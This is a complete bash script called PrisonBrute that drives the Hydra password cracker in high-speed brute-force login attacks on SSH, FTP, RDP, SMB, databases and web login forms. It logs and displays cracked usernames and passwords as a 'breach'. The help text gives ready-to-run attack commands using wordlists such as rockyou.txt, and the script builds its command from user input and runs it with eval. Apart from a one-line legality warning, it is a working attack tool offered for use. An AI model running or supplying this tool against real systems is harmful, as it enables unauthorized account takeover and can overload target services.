#!/bin/bash
PRISON_DEFAULT_TASKS=64
OUTPUT_FILE="pb_found_credentials.txt"

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[0;33m'
BLUE='\033[0;34m'
MAGENTA='\033[0;35m'
CYAN='\033[0;36m'
WHITE='\033[0;37m'
BOLD='\033[1m'
NC='\033[0m'
print_banner() {
  echo -e "${RED}${BOLD}"
  echo "██████╗ ██████╗ ██╗███████╗ ██████╗ ███╗   ██╗"
  echo "██╔══██╗██╔══██╗██║██╔════╝██╔═══██╗████╗  ██║"
  echo "██████╔╝██████╔╝██║███████╗██║   ██║██╔██╗ ██║"
  echo "██╔═══╝ ██╔══██╗██║╚════██║██║   ██║██║╚██╗██║"
  echo "██║     ██║  ██║██║███████║╚██████╔╝██║ ╚████║"
  echo "╚═╝     ╚═╝  ╚═╝╚═╝╚══════╝ ╚═════╝ ╚═╝  ╚═══╝"
  echo "               ${YELLOW}P R I S O N B R U T E${NC}"
  echo "        ${CYAN}High-Speed Hydra Attack Orchestrator${NC}"
  echo -e "${NC}"
}
print_help() {
  print_banner
  echo -e "${YELLOW}Usage: ./PrisonBrute.sh <protocol> <target> <user_source> <pass_source> [port] [options]${NC}"
  echo ""
  echo -e "${BLUE}${BOLD}Protocols Supported (Hydra backend):${NC}"
  echo -e "  ${CYAN}ssh, ftp, http-get, https-get, http-form, https-form, smb, rdp, telnet, vnc, mysql, postgres, etc.${NC}"
  echo ""
  echo -e "${BLUE}${BOLD}Arguments:${NC}"
  echo -e "  ${CYAN}<protocol>${NC}    : Service (e.g., ssh, ftp)."
  echo -e "  ${CYAN}<target>${NC}      : IP address or hostname."
  echo -e "  ${CYAN}<user_source>${NC} : Username or path to user list."
  echo -e "  ${CYAN}<pass_source>${NC} : Password or path to password list."
  echo -e "  ${CYAN}[port]${NC}        : Optional. Specific service port."
  echo ""
  echo -e "${BLUE}${BOLD}Core Speed Options:${NC}"
  echo -e "  ${CYAN}-t <tasks>${NC}    : Number of parallel tasks (default: ${BOLD}${PRISON_DEFAULT_TASKS}${NC})."
  echo -e "                 ${RED}${BOLD}WARNING:${NC} ${RED}Very high values can DoS the target or get you blocked!${NC}"
  echo -e "  ${CYAN}-w <seconds>${NC}  : Wait time between attempts per thread (default: 0 for max speed)."
  echo -e "  ${CYAN}-x <min:max:charset>${NC} : Brute force generation (e.g., -x 1:5:aA1 for 1-5 char alphanumeric)."
  echo ""
  echo -e "${BLUE}${BOLD}Other Useful Options:${NC}"
  echo -e "  ${CYAN}-f${NC}           : Stop after first found credential pair."
  echo -e "  ${CYAN}-C <file>${NC}    : Colon separated user:pass file (replaces user/pass sources)."
  echo -e "  ${CYAN}-e ns${NC}        : Additional checks: 'n' for null pass, 's' for pass=user."
  echo -e "  ${CYAN}-v / -V${NC}      : Verbose / Very Verbose (shows attempts)."
  echo ""
  echo -e "${BLUE}${BOLD}Options (for http(s)-form):${NC}"
  echo -e "  ${CYAN}/<path_to_form>${NC} : Path to login form (e.g., /login.php)."
  echo -e "  ${CYAN}\"<form_parameters>\"${NC} : Quoted string with form params (use ${BOLD}^USER^, ^PASS^${NC})."
  echo -e "                       Example: \"user=^USER^&pass=^PASS^&submit=Login\""
  echo -e "  ${CYAN}\"<failure_string>\"${NC} : Quoted string indicating FAILED login."
  echo -e "                       Example: \"Invalid username or password\""
  echo ""
  echo -e "${YELLOW}Examples:${NC}"
  echo -e "  ./PrisonBrute.sh ssh 192.168.1.101 root common_pass.txt -t 128"
  echo -e "  ./PrisonBrute.sh ftp 10.0.0.5 users.txt rockyou.txt -t 200 -f"
  echo -e "  ./PrisonBrute.sh https-form example.com users.txt pass.txt /admin \"u=^USER^&p=^PASS^\" \"Login Failed\" 443 -t 50"
  echo ""
  echo -e "${GREEN}Found credentials logged to: ${BOLD}${OUTPUT_FILE}${NC}"
  echo -e "${RED}${BOLD}USE RESPONSIBLY. UNAUTHORIZED ACCESS IS ILLEGAL.${NC}"
}
check_tool() {
  if ! command -v "$1" &> /dev/null; then
    echo -e "${RED}Error: Essential tool '${BOLD}$1${NC}${RED}' is not installed.${NC}"
    echo -e "${YELLOW}Please install it: ${CYAN}sudo apt update && sudo apt install $1${NC}"
    exit 1
  fi
}
check_tool "hydra"
if [ "$#" -lt 4 ]; then
  print_help
  exit 1
fi

PROTOCOL="$1"
TARGET="$2"
USER_SOURCE="$3"
PASS_SOURCE="$4"
shift 4

PORT_SPECIFIED=""
EXTRA_HYDRA_ARGS=()
HTTP_FORM_PATH=""
HTTP_FORM_PARAMS=""
HTTP_FORM_FAILURE_MSG=""
COMBO_FILE=""

while (( "$#" )); do
  case "$1" in
    -t)
      if [ -n "$2" ] && [[ "$2" =~ ^[0-9]+$ ]]; then
        EXTRA_HYDRA_ARGS+=("-t" "$2")
        shift 2
      else
        echo -e "${RED}Error: -t option requires a numeric argument.${NC}" >&2; exit 1
      fi
      ;;
    -w)
      if [ -n "$2" ] && [[ "$2" =~ ^[0-9\.]+$ ]]; then
        EXTRA_HYDRA_ARGS+=("-w" "$2")
        shift 2
      else
        echo -e "${RED}Error: -w option requires a numeric argument.${NC}" >&2; exit 1
      fi
      ;;
    -x)
      if [ -n "$2" ]; then
        EXTRA_HYDRA_ARGS+=("-x" "$2")
        shift 2
      else
        echo -e "${RED}Error: -x option requires an argument (min:max:charset).${NC}" >&2; exit 1
      fi
      ;;
    -f) EXTRA_HYDRA_ARGS+=("-f"); shift ;;
    -v) EXTRA_HYDRA_ARGS+=("-v"); shift ;; 
    -V) EXTRA_HYDRA_ARGS+=("-V"); shift ;;
    -e)
      if [ -n "$2" ]; then
        EXTRA_HYDRA_ARGS+=("-e" "$2")
        shift 2
      else
        echo -e "${RED}Error: -e option requires an argument (e.g., ns).${NC}" >&2; exit 1
      fi
      ;;
    -C)
      if [ -n "$2" ] && [ -f "$2" ]; then
        COMBO_FILE="$2"
        EXTRA_HYDRA_ARGS+=("-C" "$2")
        shift 2
      else
        echo -e "${RED}Error: -C option requires a valid file path.${NC}" >&2; exit 1
      fi
      ;;
    *)
      if [[ "$PROTOCOL" == "http-form" || "$PROTOCOL" == "https-form" ]]; then
        if [[ "$1" == /* ]] && [ -z "$HTTP_FORM_PATH" ]; then HTTP_FORM_PATH="$1"
        elif [ -z "$HTTP_FORM_PARAMS" ] && [[ "$1" == *"^USER^"* ]] && [[ "$1" == *"^PASS^"* ]]; then HTTP_FORM_PARAMS="$1"
        elif [ -z "$HTTP_FORM_FAILURE_MSG" ] && ! [[ "$1" =~ ^[0-9]+$ ]] && [ -z "$PORT_SPECIFIED" ] && [ -n "$HTTP_FORM_PARAMS" ]; then HTTP_FORM_FAILURE_MSG="$1"
        elif [[ "$1" =~ ^[0-9]+$ ]] && [ -z "$PORT_SPECIFIED" ]; then PORT_SPECIFIED="$1"
        else
            echo -e "${RED}Error: Unknown/misplaced arg for $PROTOCOL: $1${NC}"; print_help; exit 1
        fi
      elif [[ "$1" =~ ^[0-9]+$ ]] && [ -z "$PORT_SPECIFIED" ]; then PORT_SPECIFIED="$1"
      else
        echo -e "${RED}Error: Unknown argument: $1${NC}"; print_help; exit 1
      fi
      shift
      ;;
  esac
done

USER_PASS_OPTS=""
if [ -n "$COMBO_FILE" ]; then
  USER_SOURCE="N/A (Using -C)"
  PASS_SOURCE="N/A (Using -C)"
else
  if [ -f "$USER_SOURCE" ]; then USER_PASS_OPTS+="-L \"$USER_SOURCE\" "
  else USER_PASS_OPTS+="-l \"$USER_SOURCE\" "; fi

  if [ -f "$PASS_SOURCE" ]; then USER_PASS_OPTS+="-P \"$PASS_SOURCE\" "
  else USER_PASS_OPTS+="-p \"$PASS_SOURCE\" "; fi
fi

PORT_OPT=""
if [ -n "$PORT_SPECIFIED" ]; then
  PORT_OPT="-s $PORT_SPECIFIED"
fi

if ! [[ " ${EXTRA_HYDRA_ARGS[*]} " =~ " -t " ]]; then
  EXTRA_HYDRA_ARGS+=("-t" "$PRISON_DEFAULT_TASKS")
fi
if ! [[ " ${EXTRA_HYDRA_ARGS[*]} " =~ " -v " ]] && ! [[ " ${EXTRA_HYDRA_ARGS[*]} " =~ " -V " ]]; then
    EXTRA_HYDRA_ARGS+=("-V")
fi

HYDRA_CMD_BASE="hydra ${USER_PASS_OPTS} ${PORT_OPT}"
HYDRA_CMD_SUFFIX="${EXTRA_HYDRA_ARGS[*]} -o \"${OUTPUT_FILE}\""
TARGET_SPECIFIER="$TARGET" 
SERVICE_NAME="$PROTOCOL" 

case "$PROTOCOL" in
  "http-get"|"https-get")
    SERVICE_NAME="${PROTOCOL}:/"
    ;;
  "http-form"|"https-form")
    if [ -z "$HTTP_FORM_PATH" ] || [ -z "$HTTP_FORM_PARAMS" ] || [ -z "$HTTP_FORM_FAILURE_MSG" ]; then
        echo -e "${RED}Error: For http(s)-form, you MUST specify path, form parameters, and failure string.${NC}"
        print_help
        exit 1
    fi
    SERVICE_NAME="${PROTOCOL}:${HTTP_FORM_PATH}:${HTTP_FORM_PARAMS}:${HTTP_FORM_FAILURE_MSG}"
    ;;
esac

FULL_HYDRA_CMD="$HYDRA_CMD_BASE \"$TARGET_SPECIFIER\" $SERVICE_NAME $HYDRA_CMD_SUFFIX"

print_banner
echo -e "${RED}${BOLD}=== PRISONBRUTE INITIATED ===${NC}"
echo -e "${CYAN}Protocol........: ${BOLD}${PROTOCOL}${NC}"
echo -e "${CYAN}Target..........: ${BOLD}${TARGET}${NC}"
if [ -n "$PORT_SPECIFIED" ]; then
  echo -e "${CYAN}Port............: ${BOLD}${PORT_SPECIFIED}${NC}"
fi
if [ -n "$COMBO_FILE" ]; then
  echo -e "${CYAN}Combo File......: ${BOLD}${COMBO_FILE}${NC}"
else
  echo -e "${CYAN}User Source.....: ${BOLD}${USER_SOURCE}${NC}"
  echo -e "${CYAN}Password Source.: ${BOLD}${PASS_SOURCE}${NC}"
fi
echo -e "${CYAN}Output File.....: ${BOLD}${OUTPUT_FILE}${NC}"
if [ ${#EXTRA_HYDRA_ARGS[@]} -gt 0 ]; then
    DISPLAY_ARGS=""
    TEMP_ARGS=("${EXTRA_HYDRA_ARGS[@]}")
    while [ ${#TEMP_ARGS[@]} -gt 0 ]; do
        ARG_NAME="${TEMP_ARGS[0]}"
        DISPLAY_ARGS+="${ARG_NAME}"
        unset TEMP_ARGS[0]
        if [[ "$ARG_NAME" == "-t" || "$ARG_NAME" == "-w" || "$ARG_NAME" == "-e" || "$ARG_NAME" == "-x" || "$ARG_NAME" == "-C" ]] && [ ${#TEMP_ARGS[@]} -gt 0 ]; then
            DISPLAY_ARGS+=" \"${TEMP_ARGS[0]}\""
            unset TEMP_ARGS[0]
        fi
        DISPLAY_ARGS+=" "
        TEMP_ARGS=("${TEMP_ARGS[@]}")
    done
    echo -e "${CYAN}Hydra Options...: ${BOLD}${DISPLAY_ARGS}${NC}"
fi
echo -e "${RED}-----------------------------------------------------${NC}"
echo -e "${YELLOW}Executing Hydra: ${BOLD}${FULL_HYDRA_CMD}${NC}"
echo -e "${BLUE}--- Hydra Output (Press Ctrl+C to abort) ---${NC}"
eval "$FULL_HYDRA_CMD"
HYDRA_EXIT_CODE=$?

echo -e "${BLUE}--- Hydra Output End ---${NC}"
echo -e "${RED}-----------------------------------------------------${NC}"
if [ $HYDRA_EXIT_CODE -eq 0 ]; then
  if grep -qE "\[.+\] host: .+ login: .+ password: .+" "${OUTPUT_FILE}"; then
    echo -e "\n${GREEN}${BOLD}>>> BREACH SUCCESSFUL! <<<${NC}"
    echo -e "${GREEN}Credentials found and logged to '${BOLD}${OUTPUT_FILE}${NC}'${NC}"
    echo -e "${YELLOW}Discovered Credentials:${NC}"
    grep -E "\[.+\] host: .+ login: .+ password: .+" "${OUTPUT_FILE}" | \
    sed -e "s/^\[service\] //" -e "s/host: //" -e "s/ login: /${GREEN}User:${NC} /" -e "s/ password: / ${GREEN}Pass:${NC} /" | \
    awk '{print "  🎯 " $1 "  👤 " $2 " " $3 "  🔑 " $4 " " $5}'
  elif grep -q "host:" "${OUTPUT_FILE}"; then
    echo -e "\n${GREEN}${BOLD}>>> BREACH LIKELY! <<<${NC}"
    echo -e "${GREEN}Potential credentials found in '${BOLD}${OUTPUT_FILE}${NC}' (review manually).${NC}"
    grep "host:" "${OUTPUT_FILE}"
  else
    echo -e "\n${YELLOW}PrisonBrute cycle complete. No credentials cracked with the current lists/settings.${NC}"
  fi
else
  echo -e "\n${RED}Hydra exited with error code: $HYDRA_EXIT_CODE.${NC}"
  echo -e "${RED}PrisonBrute may have been interrupted or encountered an issue.${NC}"
  if [ -s "${OUTPUT_FILE}" ]; then
     echo -e "${YELLOW}Partial results, if any, might be in '${BOLD}${OUTPUT_FILE}${NC}'.${NC}"
  fi
fi

echo -e "${MAGENTA}PrisonBrute campaign concluded.${NC}"
